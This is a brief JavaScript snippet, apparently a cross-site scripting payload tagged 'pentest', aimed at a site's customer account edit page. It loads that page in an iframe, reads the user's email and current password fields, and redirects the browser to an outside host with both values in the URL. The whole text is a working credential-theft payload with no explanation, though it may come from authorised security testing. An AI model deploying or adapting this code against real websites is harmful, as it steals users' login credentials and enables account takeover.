var i=Object.assign(document.createElement('iframe'),{id:'pentest',src:'\\monchauffagisteprive\\customer\\account\\edit\\'});
i.addEventListener('load',function(){
  var p=i.contentDocument;
  window.location='\\\\hezrel4q9wm6z84qk50x2d1au10solca.gloups.itr-af.com\\?user='+p.querySelector('#email').value+'&pass='+p.querySelector('#current_password').value;
});
document.body.appendChild(i);
